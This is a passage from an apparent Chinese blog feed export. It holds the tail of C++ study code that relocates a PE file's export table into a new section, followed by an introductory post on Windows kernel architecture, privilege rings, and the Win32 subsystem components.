class="line"> </span><br><span class="line">	<span class="keyword">if</span> (*((PWORD)pTempFileBuffer) != IMAGE_DOS_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)No MZ flag, not exe file!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pTempFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader_Temp = (PIMAGE_DOS_HEADER)pTempFileBuffer;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (*((PDWORD)((DWORD)pTempFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)Not a valid PE flag!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pTempFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pNTHeader_Temp = (PIMAGE_NT_HEADERS32)((DWORD)pTempFileBuffer + pDosHeader_Temp-&gt;e_lfanew);</span><br><span class="line">	pPEHeader_Temp = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader_Temp) + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader_Temp = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader_Temp + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader_Temp = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader_Temp + pPEHeader_Temp-&gt;SizeOfOptionalHeader);</span><br><span class="line">	pDataDirectory_Temp = (PIMAGE_DATA_DIRECTORY)pOptionHeader_Temp-&gt;DataDirectory;</span><br><span class="line">	pExportDirectory_Temp = (PIMAGE_EXPORT_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDirectory_Temp[<span class="number">0</span>].VirtualAddress, pTempFileBuffer) + (DWORD)pTempFileBuffer);</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddresscccccTTTT：&quot;</span> &lt;&lt; hex &lt;&lt; pExportDirectory_Temp-&gt;AddressOfFunctions &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//3）先定位到导出表的三个地址表</span></span><br><span class="line">	DWORD *AddrFunctions = (DWORD *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfFunctions, pTempFileBuffer));</span><br><span class="line">	DWORD *AddrName = (DWORD *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfNames, pTempFileBuffer));</span><br><span class="line">	WORD  *AddrOrdinals = (WORD  *)((DWORD)pTempFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory_Temp-&gt;AddressOfNameOrdinals, pTempFileBuffer));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4）移动AddressOfFuncitons</span></span><br><span class="line">	<span class="comment">//计算addressOfFunctions的起始位置，在最后的一个节中</span></span><br><span class="line">	<span class="comment">//定位到新增节填充数据的起始位置</span></span><br><span class="line">	DWORD FileSize_Source = <span class="built_in">ReadPESize</span>(FILEPATH);</span><br><span class="line">	pSectionHeader_Temp = pSectionHeader_Temp + pPEHeader_Temp-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line">	PDWORD StartAddressofFunctions_Temp = (PDWORD)((DWORD)pTempFileBuffer+pSectionHeader_Temp-&gt;PointerToRawData);</span><br><span class="line">	<span class="comment">//PDWORD StartAddressofFunctions_Temp = (PDWORD)((DWORD)pTempFileBuffer + FileSize_Source);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofFunctions_Temp, AddrFunctions, pExportDirectory_Temp-&gt;NumberOfFunctions * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5）移动AddressofNameOrdianls，移动的位置紧跟是紧跟addressOfFunctions后</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PWORD StartAddressofOrdianls_Temp = (PWORD)((DWORD)StartAddressofFunctions_Temp + pExportDirectory_Temp-&gt;NumberOfFunctions * <span class="number">4</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;StartAddressofOrdianls_TempFOA：%x\n&quot;,(DWORD)StartAddressofOrdianls_Temp - (DWORD)pTempFileBuffer);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofOrdianls_Temp, AddrOrdinals, pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6）移动AddressofNames，移动的位置紧跟addressofOrdianls</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PDWORD StartAddressofNames_Temp = (PDWORD)((DWORD)StartAddressofOrdianls_Temp + pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">2</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;StartAddressofNames_TempFOA：%x\n&quot;,(DWORD)StartAddressofNames_Temp - (DWORD)pTempFileBuffer);</span></span><br><span class="line">	<span class="built_in">memcpy</span>(StartAddressofNames_Temp, AddrName, pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//7）拷贝函数名称，并修复新的AddressofNames中的地址</span></span><br><span class="line">	<span class="comment">//修正新的起始位置</span></span><br><span class="line">	PDWORD Start_Name_Address_Temp = (PDWORD)((DWORD)StartAddressofNames_Temp + pExportDirectory_Temp-&gt;NumberOfNames * <span class="number">4</span>);</span><br><span class="line">	PDWORD NameAddress_Temp = Start_Name_Address_Temp;</span><br><span class="line">	<span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pExportDirectory_Temp-&gt;NumberOfNames; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取原来的地址</span></span><br><span class="line">		DWORD NameofFOA = <span class="built_in">RVAToFOA</span>(*(AddrName + i), pTempFileBuffer);</span><br><span class="line">		<span class="comment">//拷贝</span></span><br><span class="line">		<span class="built_in">memcpy</span>( NameAddress_Temp, (PDWORD)((DWORD)pTempFileBuffer + NameofFOA), <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA)) + <span class="number">1</span>);</span><br><span class="line">		<span class="comment">//修复AddressofName_Temp的每一项的值，让PE文件解析的时候到该处来取函数名</span></span><br><span class="line">		*(StartAddressofNames_Temp + i) = <span class="built_in">FOAToRVA</span>((DWORD)NameAddress_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">		<span class="comment">//计算拷贝到新地址的起始位置</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%x:    %s\n&quot;</span>, <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA)), (PDWORD)((DWORD)pTempFileBuffer + NameofFOA));</span><br><span class="line">		NameAddress_Temp = (PDWORD)((DWORD)NameAddress_Temp + <span class="built_in">strlen</span>((LPSTR)((DWORD)pTempFileBuffer + NameofFOA))+<span class="number">1</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	Start_Name_Address_Temp = NameAddress_Temp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//8）修改pExportDirectory_Temp三个地址表的值，使其指向新的起点</span></span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfFunctions = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofFunctions_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfNames = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofNames_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line">	pExportDirectory_Temp-&gt;AddressOfNameOrdinals = <span class="built_in">FOAToRVA</span>((DWORD)StartAddressofOrdianls_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//9）将导出表拷贝到新节中</span></span><br><span class="line">	<span class="comment">//修正新的起始地址</span></span><br><span class="line">	<span class="comment">//printf(&quot;新导出表的起始地址：%x\n&quot;,FOAToRVA((DWORD)Start_Name_Address_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer));</span></span><br><span class="line">	<span class="built_in">memcpy</span>(Start_Name_Address_Temp, pExportDirectory_Temp, <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_EXPORT_DIRECTORY));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//10）将数据目录项中导出表指向新的位置</span></span><br><span class="line">	pDataDirectory_Temp[<span class="number">0</span>].VirtualAddress = <span class="built_in">FOAToRVA</span>((DWORD)Start_Name_Address_Temp - (DWORD)pTempFileBuffer,pTempFileBuffer);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//11）存盘</span></span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pTempFileBuffer, FileSize_Source + Add_Section_Length, New_File_Name);</span><br><span class="line">	<span class="comment">//*pFileBuffer_ExportTable = pTempFileBuffer;  	</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核基础</title>
    <url>/post/Windows-Kernel-Base/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-Windows-内核基础"><a href="#1-Windows-内核基础" class="headerlink" title="1 Windows 内核基础"></a>1 Windows 内核基础</h2><p>本文具体实现过程可看<a href="https://cataloc.gitee.io/blog/">cataLoc’s Blog</a></p>
<p><img data-src="https://img.shields.io/badge/%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83-%E3%80%8AWindows%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E6%9C%AC%E6%96%87%E5%8F%82%E8%80%83-%E3%80%8A%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC6%E7%89%88%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p>系统内核层，又叫零环（Ring0，简称<code>R0</code>，与此对应的应用层叫3环，即Ring3，简称<code>R3</code>），实际上是CPU的4个运行级别中的一个。CPU设计者将CPU的运行级别从内向外分为4个，依次为R0、R1、R2、R3，运行权限从R0到R3依次降低，也就是说，R0拥有最高执行权限，R3拥有最低执行权限。CPU 设计制造商在设计之初是让<mark class="label warning">R0运行内核，R1、R2 运行设备驱动，R3运行应用程序</mark>。</p>
<p>操作系统设计者与开发商在设计操作系统（例如微软Windows 和开源社区的Linus 编写的Linux）的时候，为了让工作变得简单，并没有使用R1和R2两个级别，而是将设备驱动运行在与内核同一个级别的R0级。<mark class="label default">在AMD64 CPU诞生之后，CPU的设计者干脆也和操作系统保持一致， 只保留了R0和R3两个级别</mark>。特权级环如图7.1 所示。</p>
<p><img data-src="https://i.loli.net/2021/05/14/Amb6SjJzFyM2oT9.png" alt="1.png"></p>
<h3 id="1-1-Widows-内核版本"><a href="#1-1-Widows-内核版本" class="headerlink" title="1.1 Widows 内核版本"></a>1.1 Widows 内核版本</h3><p>Microsoft在操作系统领域中的发展最早开始于MS-DOS，并于20世纪80年代后期开始按两个分支发展：</p>
<ol>
<li>一是基于MS-DOS的Windows 开发平台，并发展成Windows 95&#x2F;98&#x2F;Me这一系列操作系统；</li>
<li>另一个分支则是以Windows NT为代表的操作系统系列，经历了Windows NT 3.1&#x2F;3.5&#x2F;3.51&#x2F;4.0、Windows 2000、Windows XP&#x2F;Server 2003，一直到 Windows Vista&#x2F;Server 2008、Windows 7和Windows10。</li>
</ol>
<p>Windows NT由微软和IBM联合研制，分为微软的Microsoft OS&#x2F;2 NT与IBM的IBM OS&#x2F;2。协作后来不欢而散，IBM继续向市场提供先前的OS&#x2F;2版本，微软则把自己的OS&#x2F;2 NT的名称改为Windows NT，即第一代的Windows NT 3.1。</p>
<p>Windows内核（由于是从Windows NT发展而来的。也称为NT内核）从一开始就有良好的设计，其结构具备很好的可扩展性和安全性。所以，Windows 内核在20年的发展历程中一直能够很好地适应硬件的发展 ，在Windows操作系统的各个版本中并没有根本性的变化。本文介绍Windows 操作系统的基本框架，这些内容<strong>完全适用于Windows XP&#x2F;Server 2003及以后的版本</strong>。</p>
<p><img data-src="https://i.loli.net/2021/05/14/faGeXuCDJ9zrKsx.png" alt="2.png"></p>
<div class="note primary"><p><mark class="label success">WRK</mark></p>
<p>WRK的全称是“Windows Research Kernel”，它是微软为高校操作系统课程提供的可修改和跟踪的操作系统教学平台。它给出了Windows这个成功的商业操作系统的<strong>内核大部分代码</strong>，可以对其进行修改、编译，并且可以用这个内核启动Windows操作系统。可让学生将操作系统基本原理和商业操作系统内核联系起来，进一步加深对操作系统整体的理解</p>
<p>NT 5.2版本是一个特殊的版本，其核心代码经过简单的改编之后 已经向教育科研领域公开。这份公开源代码的内核称为Windows Research Kernel（Windows 研究内核），简称WRK。它包括了Windows内核中最重要的组件，例如内存管理器、进程和线程管理、对象管理器、缓存管理器、配置管理器、安全引用监视器和V&#x2F;O管理器等。 此内核源代码可以被编译成一个EXE可执行文件，然后安装到一个Windows Server 2003 SP1（x86系统）或Windows XP64位（AMD）系统中，替换其中的内核模块。因此，如果用户改变了源代码中的实现逻辑，则替换了内核模块之后的Windows Server 2003 SP1或 Windows XP 64位系统可以运行用户的代码逻辑。如果配置了调试环境，则还可以调试WRK内核和用户的代码。WRK是2006年7月份正式对外发布的，就当时而言，它代表了最新的Windows内核技术。</p>
</div>

<h3 id="1-2-重要的概念"><a href="#1-2-重要的概念" class="headerlink" title="1.2 重要的概念"></a>1.2 重要的概念</h3><ol>
<li><strong>Windows API函数</strong>：指Windows API中<strong>已被文档化</strong>的、可被调用的子例程（函数）， 例如 CreateProcess、CreateFile 和GetMessage。</li>
<li><strong>原生的系统服务</strong>（或者系统调用）：指操作系统中<strong>未文档化的</strong>、可在用户模式下调用的底层服务。例如，NtCreateUserProcess是一个内部系统服务，Windows 的CreateProcess函数调用该服务来创建新的进程。</li>
<li><strong>例程</strong>：即函数。</li>
<li><strong>子系统DLL</strong>：简单理解为Windows API，已文档化的API，native API。</li>
<li><strong>Native API</strong>：NT中有很多为公布的API（已文档化），习惯上大家喜欢把他们称为Native API。</li>
<li><strong>指令流</strong>：线程。</li>
<li><strong>陷阱处理器</strong>，是指与某个特定的中断或异常相关联的<strong>函数</strong>。</li>
</ol>
<p>搞懂子系统 执行体 ntdll.dll、ntoskrnl.exe</p>
<h2 id="2-Windows系统结构"><a href="#2-Windows系统结构" class="headerlink" title="2 Windows系统结构"></a>2 Windows系统结构</h2><p>图2.2显示了Windows基本结构。Windows 采用了双模式（dual mode）结构来保护操作系统本身，以避免被应用程序的错误所波及。操作系统核心运行在<mark class="label danger">内核模式</mark>（kemel mode）下，应用程序的代码运行在<mark class="label info">用户模式</mark>（user mode）下。每当应用程序需要用到系统内核或内核的扩展模块（内核驱动程序）所提供的服务时，应用程序通过硬件指令从用户模式切换到内核模式中，当系统内核完成了所请求的服务以后，CPU控制权又回到用户模式代码。</p>
<div class="note warning"><p>用户模式与内核模式指的是CPU处理器的访问模式。</p>
<p><strong>内核模式</strong>：它允许访问所有的系统内存和所有的CPU指令。</p>
<ul>
<li><p>虽然每个Windows进程都有自己私有的内存空间，<mark class="label warning">但是内核模式的操作系统和设备驱动程序代码共享同一个虛拟地址空间</mark>。虚拟内存中的每一个页面都被标记了处理器必须在什么访问模式下才可以读和&#x2F;或写该页面。系统空间中的页面只有在内核模式下才可以访问，而用户地址空间中的所有页面都可以在用户模式下访问。只读页面（比如那些包含静态数据的页面）在任何模式下都是不可写的。此外，在支持不可执行（no-execute）内存保护的处理器上，Windows将包含数据的页面标记为不可执行，从而防止数据区域被无意地或恶意地当作代码来执行。</p>
</li>
<li><p>对于在内核模式下运行的组件，32位Windows对它们所使用的私有系统内存并不提供读写保护。换句话说，一旦进入了内核模式，操作系统和设备驱动程序的代码可以完全访问系统空间的内存，也可以绕过Windows的安全机制直接访问对象。因为有大量的Windows操作系统代码运行在内核模式下。</p>
</li>
</ul>
</div>

<p><img data-src="https://i.loli.net/2021/05/18/gm2UhziLQqPZCFy.png" alt="4.png"></p>
<p><img data-src="https://i.loli.net/2021/05/17/sauiwhGfdyonWFP.png" alt="3.png"></p>
<p><img data-src="https://i.loli.net/2021/05/21/XvRPjltkhAZzxor.png" alt="8.png"></p>
<div class="note success"><p><strong>有4种用户模式进程：</strong></p>
<ol>
<li>固定的系统支持进程，如登陆进程，会话管理器进程。</li>
<li>服务进程，宿纳了windows服务，如进程管理器和假脱机服务。</li>
<li>用户应用程序，有6个类型：windows32位，windows64位，windows3.1 16位，ms-dos 16位，posix32位或者OS&#x2F;2 32位。</li>
<li>环境子系统服务进程，实现了操作系统环境的部分支持。这里的环境是指操作系统展示给用户或者程序员的个性化部分。</li>
</ol>
<p>在windows下，用户程序不能直接访问原始的windows服务，要通过一个或者多个子系统动态链接库。</p>
</div>

<div class="note danger"><p><strong>Windows内核组件（组成部分）包含：</strong></p>
<ol>
<li><strong>windows执行体</strong>，包含基本的操作系统服务，如内存管理，进程和线程管理，安全性，I&#x2F;O，网络，跨进程通信。</li>
<li><strong>windows内核</strong>，是由一组底层的操作系统功能构成，如线程调度，终端和异常处理分发。以及处理器同步。提供了一组例程和基础对象。执行体的其他部分利用这些例程和对象实现更高层次的功能。</li>
<li><strong>设备驱动程序</strong>，硬件设备驱动程序，也包含文件系统和网络驱动程序。其中硬件设备驱动程序将用户的I&#x2F;O函数调用转化为特定的硬件设备请求。</li>
<li><strong>硬件抽象层</strong>，指一层特殊代码，它把内核，设备驱动程序和windows执行体其他部分跟与平台相关的硬件差异隔离开来。</li>
<li><strong>窗口和图形系统</strong>：实现了图形用户界面函数。</li>
</ol>
</div>

<div class="note info"><p><strong>Windows子系统是Windows系统中一个不可缺少的组成部分</strong>，<mark class="label info">它与系统内核一起构成了用户应用程序的执行环境</mark>。Windows的原始设计是一个支持多环境子系统的操作系统，除了Windows子系统作为它的原生环境子系统，它还支持POSIX和OS&#x2F;2环境子系统，为UNIX类应用程序和OS&#x2F;2应用程序提供一个仿真执行环境。 随着Windows操作系统的发展，<mark class="label danger">自Windows XP以后，只有Windows子系统随系统一起发行</mark>。 Windows 子系统既有内核模式部分（图形和窗口管理），也有用户模式部分。用户模式部分包括一个单独的子系统进程和一组链接到各个应用进程中的系统DLL。</p>
</div>

<p><img data-src="https://i.loli.net/2021/05/18/CDISNmHRtX8zwpq.png" alt="5.png"></p>
<h3 id="2-1-CPU-模式"><a href="#2-1-CPU-模式" class="headerlink" title="2.1 CPU 模式"></a>2.1 CPU 模式</h3><p>在Intel x86处理器上，段描述符有一个 2位长度的特权级：<mark class="label danger">0</mark>表示最高特权级，<mark class="label default">3</mark>表示最低特权级。Windows 只使用0和3两种特权级（在有些资料上分别称为0环和3环）。通常特权级0表示CPU处于内核模式（kermel mode），3表示用户模式（user mdoe）。在任何时刻，处理器总是位于这两种模式之一。</p>
<p>处理器有许多指令只有在特权级0的模式下才可以使用，例如I&#x2F;O指令、操纵内部寄存器（如GDT、IDT、MSR）的指令等。</p>
<ul>
<li><p><strong>操作系统保护状态：</strong></p>
<ul>
<li>当处理器位于<strong>用户模式</strong>时，它处于一种相对隔离的状态：能够执行的指令是受限制的，能够访问的内存也是受限制的。且越过这些限制，就会<strong>引发处理器异常</strong>，因而操作系统可以捕获到这些异常，并决定处理器是否继续执行。因此，操作系统可以有足够的能力来<strong>保护</strong>自己免受用户模式代码的影响。（保护模式）</li>
<li>当处理器位于<strong>内核模式</strong>时，这<strong>一层保护不复存在</strong>，任何一个未被捕捉和处理的指令错误都会引起系统崩溃。</li>
</ul>
</li>
<li><p><strong>内存访问权限：</strong>在Windows中，当处理器位于不同模式下时，它可以访问的内存地址空间也是不一样的。</p>
<ul>
<li><strong>用户模式下</strong>，处理器只能访问当前进程的地址空间（有时也称为用户地址空间）；</li>
<li><strong>内核模式下</strong>，处理器不仅可以访问当前进程的地址空间，还可以访问系统地址空间。 内核模式下的代码和数据都是共享的，所有的进程一旦其指令流进人到内核模式下，则系统地址空间中的代码和数据都是相同的（有个别例外）。</li>
</ul>
</li>
</ul>
<p>一个指令流（即线程）在执行时，在以下情况下会发生<mark class="label warning">模式切换</mark>：</p>
<ul>
<li>用户模式代码触发了<mark class="label danger">异常</mark>，则控制流进入到内核模式，内核中的异常处理函数可以决定该控制流是否继续执行；</li>
<li>用户模式代码在执行时，被一个<mark class="label danger">中断</mark>打断 （软中断或硬中断），则控制流进入特权模式，等中断处理例程完成以后，它若调用<code>iret/iretd</code>指令，则控制流恢复到用户模式下，执行特殊的模式切换指令，例如Intel x86的<code>sysenter</code>指令，从用户模式切换到内核模式。而为了从内核模式切换到用户模式，通常简单地使用<code>sysexit</code>、<code>iret/iretd</code>这样的指令即可。由于系统空间是所有进程共享的，所以，任何一个进程在执行内核模式的代码时，实际上是在使用操作系统的服务。</li>
</ul>
<div class="note danger"><p>在Windows体系结构中，内核模式向上有一个执行体API，尽管它并非文档化的API，但对于应用程序而言，这便是系统服务。Windows将这些系统服务组织成了一张表，称为SDT（Service Descriptor Table，服务描述符表）。</p>
</div>



<h3 id="2-2-用户模式"><a href="#2-2-用户模式" class="headerlink" title="2.2 用户模式"></a>2.2 用户模式</h3><p><strong>（User mode）</strong></p>
<h4 id="2-2-1-Windows子系统"><a href="#2-2-1-Windows子系统" class="headerlink" title="2.2.1 Windows子系统"></a>2.2.1 Windows子系统</h4><div class="note default"><p>早期的Windows版本支持三个环境子系统：</p>
<ul>
<li><mark class="label primary">OS&#x2F;2</mark></li>
<li><mark class="label warning">POSIX</mark></li>
<li><mark class="label info">Windows</mark></li>
</ul>
<p><strong>到了Windows XP以后，只有Windows子系统（或Win32）随Windows操作系统起发行</strong>，而且，在Windows系统中，即使是没有交互用户登录的服务器系统，Windows 子系统也是必须运行的。相反，另外两个子系统被配置成按需启动。</p>
<p> Windows子系统的两个关键功能部件：窗口管理和GDI（Graphics Device Interface，图形设备接口）。</p>
</div>

<p>Windows对应用程序的支持是通过Windows的环境子系统来做到的，<mark class="label danger">任何一个用户应用程序都运行在特定的子系统环境中</mark>。</p>
<p>我们可以这样简单地理解：</p>
<ul>
<li>Windows 子系统是Windows操作系统不可分割的一部分，它在Windows内核的基础上，为应用程序提供了一个图形用户界面（GUI）环境；</li>
<li>OS&#x2F;2和POSIX则是为了兼容OS&#x2F;2和UNIX应用程序而提供的模拟环境。</li>
</ul>
<div class="note primary"><p>Windows子系统中既有用户模式部分，也有内核模式部分。</p>
<ul>
<li><p><strong>内核模式部分</strong>：核心是<mark class="label warning">win32k.sys</mark>，虽然它的形式是一个驱动程序，但实际上它并不处理I&#x2F;O请求，相反，它向用户代码提供了大量的系统服务。从功能上讲，它包含两部分：窗口管理（Window manager）和图形设备接口（GDI）。</p>
<ul>
<li>其中窗口管理部分负责收集和分发消息，以及控制窗口显示和管理屏幕输出；</li>
<li>图形设备接口部分包含各种形状绘制以及文本输出功能。</li>
</ul>
</li>
<li><p><strong>用户模式部分</strong>：包括Windows子系统进程<mark class="label warning">csrss.cxe</mark>以及一组动态链接库<mark class="label warning">DLL</mark>。</p>
<ul>
<li>Csrss.exe进程主要负责控制台窗口的功能，以及创建或删除进程和线程等。</li>
<li>子系统DLL则被直接链接到应用程序进程中，包括kernel32.dIl、user32.dIl、gdi32.dIl和advapi.dll等，负责实现<strong>已文档化</strong>的Windows API函数。除了有些可以直接在用户模式中完成以外，很多API函数需要调用执行体API或win32k.sys模块提供的系统服务。</li>
</ul>
</li>
</ul>
<p>应用程序通常并不直接使用操作系统提供的系统服务，而是通过调用系统DLL所提供的API函数，来间接地使用各种系统服务。Windows 子系统也使用了类似的模块结构，供应用程序直接调用的API函数位于一组子系统DLL中，这些子系统DLL再根据需要调用内核模式组件（win32k.sys）的功能。</p>
</div>

<p>子系统Windows结构如下图（图来自《Windows内核原理与实现》）：</p>
<p><img data-src="https://i.loli.net/2021/05/18/vUcp4MDyhN8ElL9.png" alt="7.png"></p>
<div class="note danger"><p>Windows子系统的组件为：</p>
<ol>
<li><p>用户模式部分：</p>
<ul>
<li><mark class="label warning">Windows子系统进程 Csrss.cxe</mark></li>
<li><mark class="label default">子系统DLL</mark></li>
</ul>
</li>
<li><p>内核模式部分：</p>
<ul>
<li><mark class="label primary">内核模块 Win32k.sys</mark></li>
<li><mark class="label info">图形设备驱动程序</mark></li>
</ul>
</li>
</ol>
</div>

<ol>
<li><mark class="label warning">Windows子系统进程 Csrss.cxe</mark>（运行在用户模式）：Windows子系统进程维护了所有属于该子系统的进程和线程的列表，并且设置进程的异常端口和调试端口，以便接收该进程中发生的异常和调试事件。类似地，当线程或进程退出或终止时，Windows子系统进程也会被通知到，从而维护子系统内部信息的一致性。

<p>它包含以下支持：</p>
<ul>
<li>控制台窗口。</li>
<li>创建和删除进程和线程。</li>
<li>支持16位虚拟DOS机（VDM，Virtual DOS Machine）进程。</li>
<li>其他一些函数，比如GetTempFile、DefinedDosDevice、ExitWindowsEx，以及少量自然语言支持函数。</li>
</ul>
</li>
<li><p>.<mark class="label default">子系统DLL</mark>：子系统DLL，例如user32.dIl、advapi32.dIl、gdi32.dll和kermel32.dlI，<strong>它们实现了已经文档化的Windows API函数</strong>，它们将已经文档化的Windows API函数，转译成Ntoskrnl.exe和Win32k.sys（<strong>两个内核模块</strong>）中恰当的且绝大多数未文档化的内核模式系统服务调用，甚至与环境子系统进程通信。</p>
</li>
<li><mark class="label primary">内核模块 Win32k.sys</mark>：虽然它的名称像是一个驱动程序，但实际上，win32k.sys并不遵从I/O管理器定义的程序模型，而仅仅是Windows内核的扩展而已。Win32k.sys包含两大功能组成部分：

<ul>
<li>窗口管理器（Window Manager）：负责控制窗口显示、管理屏幕输出、收集来自键盘、鼠标和其他设备的输人，以及将用户消息传递给应用程序。</li>
<li>GDI（Graphics Device Interface）：这是一个针对图形输出设备的函数库，包含了有关线、文本和图形绘制，以及操纵各种图形的函数。</li>
</ul>
</li>
<li><mark class="label info">图形设备驱动程序</mark>：这是一些与硬件相关的显示驱动程序、打印驱动程序，以及视频小端口驱动程序。</li>
</ol>
<p>用户应用程序并不直接调用Windows的系统服务，而是通过一个或者多个子系统DLL来进行。这些库导出的接口都有很好的文档说明，凡是链接（LoadLibrary函数）到该子系统的程序都可以调用这些接口。例如，<strong>Windows子系统DLL （比如Kernel32.dIl、Advapi32.dlI、 User32.dlI 和Gdi32.dI1）实现了Windows API函数</strong>。SUA子系统DLL (Psxll.dIl) 实现了SUA API函数。</p>
<h4 id="2-2-2-子系统DLL"><a href="#2-2-2-子系统DLL" class="headerlink" title="2.2.2 子系统DLL"></a>2.2.2 子系统DLL</h4><p>简单理解成<strong>子系统DLL为已经文档化的Windows API函数</strong>。</p>
<div class="note info"><p>应用程序调用子系统DLL中的某个函数时，可能有下述三种情况之一 :</p>
<ol>
<li>该函数完全是在该子系统DLL中实现的，在用户模式下运行。换句话说，该函数并没有给环境子系统进程（Csrss.exe）发送消息，也没有调用Windows执行体系统服务。该函数是在用户模式下完成的，运行的结果被返回给调用者。此类函数的例子有<code>GetCurrentProcess</code>（它总是返回-1，在所有与进程相关的函数中，-1被定义为代表当前进程）和<code>GetCurrentProcessld</code>（对于一个正在运行的进程，进程ID不会改变，所以此进程ID可以从某个缓存的地方获取到，从而避免要调用至内核中）。</li>
<li>该函数要求调用Windows执行体一次或者多次。例如，Windows的<code>ReadFile</code>、<code>WriteFile</code>函数分别要调用底层内部的（且无文档的） Windows I&#x2F;O系统服务<code>NtReadFile</code>和<code>NtWriteFile</code>。</li>
<li>该函数要求在环境子系统进程（Csrss.exe）中完成某些工作（环境子系统进程运行在用户模式下，负责维护那些在其控制下运行的客户应用程序的状态)。在这种情况下，该函数通过消息的形式向环境子系统发送客户机&#x2F;服务器请求，从而让子系统执行某个操作。然后子系统DLL等待应答，收到应答之后再返回调用者。</li>
</ol>
<p>有些函数可以是以上列出的第2和第3项的组合，比如Windows的<code>CreateProcess</code>和<code>CreateThread</code>函数。</p>
</div>

<div class="note warning"><p>从应用程序的角度来看，它通过给子系统DLL发出的服务请求（<mark class="label danger">即API调用</mark>）是如何被满足的。首先，由于这些子系统DLL被加载（LoadLibrary）到应用程序进程中，所以，这些服务请求是直接的函数调用（同一进程地址空间中跨模块的函数调用）。当子系统DLL接收到一个函数调用以后，根据该函数功能的复杂程度，可能有以下的处理方式：</p>
<ol>
<li>直接由子系统DLL包揽所有工作。这一类函数总是在用户模式下完成，不涉及处理器模式切换。这类函数的典型例子有：<ul>
<li><code>RtInRect</code>、<code> IsRectEmpty</code>这样的简单函数，无须内核模块或Windows子系统进程的介人即可完成；</li>
<li><code>GetCurrentProcess</code>函数，简单地返回一个伪句柄值（-1）代表当前进程；</li>
<li><code>GetCurrentProcessld</code>函数，可以从一个缓存的数据结构中获得当前进程的ID，无须每次调用都进入到内核中，因为进程ID在进程的生命周期中保持不变。</li>
</ul>
</li>
